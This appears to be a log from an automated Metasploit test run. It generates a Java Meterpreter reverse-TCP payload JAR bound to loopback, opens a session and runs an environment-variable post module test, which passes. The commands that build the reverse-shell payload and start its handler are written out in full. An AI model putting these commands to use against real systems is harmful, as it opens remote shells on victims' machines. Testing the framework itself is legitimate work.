use java/meterpreter/reverse_tcp
irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
setg SessionTlvLogging file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20240104-6888-slzqectxt
msf6 payload(java/meterpreter/reverse_tcp) > msf6 payload(java/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20240104-6888-slzqectxt
msf6 payload(java/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20240104-6888-eyoul7.jar -f jar AutoVerifySessionTimeout=30 lport=6008 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/javameterpreterreverse_tcp_debug_log20240104-6888-gj2lxptxt spawn=0
[*] Writing 5259 bytes to D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20240104-6888-eyoul7.jar...
msf6 payload(java/meterpreter/reverse_tcp) > to_handler
[*] Payload Handler Started as Job 7
msf6 payload(java/meterpreter/reverse_tcp) > 
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:6008 
[*] Sending stage (57971 bytes) to 127.0.0.1
[*] Meterpreter session 8 opened (127.0.0.1:6008 -> 127.0.0.1:50120) at 2024-01-04 17:40:59 +0000
use test/get_env
msf6 post(test/get_env) > run session=8 AddEntropy=true Verbose=true
[*] Running against session 8
[*] Session type is meterpreter and platform is windows
[+] should return windows path
[+] should handle % signs
[+] should return multiple envs
[*] Testing complete in 0.05 seconds
[*] Passed: 3; Failed: 0; Skipped: 0
[*] Post module execution completed
msf6 post(test/get_env) > sessions -K
jobs -K
[*] Killing all sessions...
[*] 127.0.0.1 - Meterpreter session 8 closed.
msf6 post(test/get_env) > Stopping all jobs...
msf6 post(test/get_env) > 